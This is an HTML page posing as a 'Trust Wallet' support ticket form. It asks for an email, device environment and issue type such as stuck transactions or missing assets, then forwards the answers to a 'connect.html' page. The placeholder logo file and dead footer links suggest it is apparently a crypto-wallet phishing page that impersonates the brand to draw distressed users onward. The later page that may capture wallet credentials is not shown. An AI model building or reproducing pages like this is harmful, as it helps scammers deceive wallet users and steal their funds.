<body>

  <!-- Header Logo -->
  <header class="py-4 text-center">
<header class="py-4 text-center">
  <div class="d-flex justify-content-center align-items-center gap-2">
    <img src="download.png" alt="Logo" height="60">
    <span class="h5 mb-0 fw-semibold">Trust Wallet</span>
  </div>
</header>

  </header>

  <!-- Main Form -->
  <main class="container my-5" style="max-width: 500px;">
    <h2 class="text-center mb-4">Submit a Ticket</h2>
    <form action="connect.html" method="GET">
      <div class="mb-3">
        <label for="email" class="form-label">Email Address</label>
        <input type="email" id="email" name="email" class="form-control" required />
      </div>

      <div class="mb-3">
        <label for="env" class="form-label">Environment</label>
        <select id="env" name="env" class="form-select" required>
          <option value="">Select</option>
          <option value="desktop">Desktop</option>
          <option value="mobile">Mobile App</option>
          <option value="extension">Extension</option>
          <option value="N/A">N/A</option>
        </select>
      </div>

      <div class="mb-4">
        <label for="issue" class="form-label">Issue Type</label>
        <select id="issue" name="issue" class="form-select" required>
          <option value="">Select</option>
          <option value="transaction">Transaction Issues</option>
          <option value="wallet">Wallet Not Opening</option>
          <option value="Wrong Network">Wrong Network</option>
          <option value="Wrong Address">Wrong Address</option>
                    <option value="cancel Transaction">Cancel Transaction</option>
                    <option value="Network Fees">Network Fees</option>
                    <option value="Dust UTXO Error">Dust UTXO Error</option>
                    <option value="Forgot Memo or Destination Tag">Forgot Memo or Destination Tag</option>
                              <option value="Sent to Smart Contract">Sent to Smart Contract</option>
                              <option value="Transaction History">Transaction History</option>
                              <option value="Pending/Stuck Transaction">Pending/Stuck Transaction</option>
                              <option value="Unable to Receive">Unable to Receive</option>




          <option value="security">Security Concerns</option>
          <option value="missing">Missing Assets</option>
        </select>
      </div>

      <div class="d-grid">
        <button type="submit" class="btn btn-primary">Continue</button>
      </div>
    </form>
  </main>

  <!-- Footer -->
  <footer class="bg-light py-5 mt-5">
    <div class="container">
      <div class="row">
        <!-- Logo -->
    <div class="col-md-4 text-center text-md-start mb-3">
  <div class="d-flex align-items-center gap-2">
    <img src="download.png" alt="Logo" height="40">
    <span class="fw-semibold">Trust Wallet</span>
  </div>
</div>


        <!-- Column 2 -->
        <div class="col-md-4 text-center mb-3">

          <div><a href="#">Privacy Policy</a></div>
          <div><a href="#">Submit DApp</a></div>
        </div>
      </div>
    </div>
  </footer>

</body>
